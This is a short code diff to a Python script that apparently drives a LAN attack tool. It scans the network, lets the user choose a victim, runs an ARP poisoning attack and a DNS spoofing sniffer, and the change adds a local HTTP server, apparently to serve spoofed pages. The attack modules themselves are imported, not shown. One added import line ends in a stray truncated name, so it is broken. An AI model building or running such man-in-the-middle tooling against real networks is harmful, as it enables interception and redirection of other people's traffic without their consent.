@@ -1,12 +1,13 @@
 from __future__ import unicode_literals
 from scapy.all import get_if_list
-from prompt_toolkit.shortcuts import radiolist_dialog, input_dialog, message_dialog
+from prompt_toolkit.shortcuts import radiolist_dialog, input_dialog, message_dialog, ch
 from arp_poison import ARPPoisonAttack
 from client import Client
 from netifaces import ifaddresses, AF_INET
 from ipaddress import ip_network
 from dns_spoof import Sniffer
 from time import sleep
+from web import HTTPServer
 
 from network_scan import NetworkScan
 from utils import stu, uts
@@ -60,10 +61,13 @@ victim = radiolist_dialog(
 arpAttack = ARPPoisonAttack(iface, victim, clients)
 arpAttack.execute()
 
-sniffer = Sniffer()
+sniffer = Sniffer(iface, victim)
+httpServer = HTTPServer()
 
 print("[*] Start sniffing...")
 sniffer.start()
+
+httpServer.start()
 
 try:
     while True:
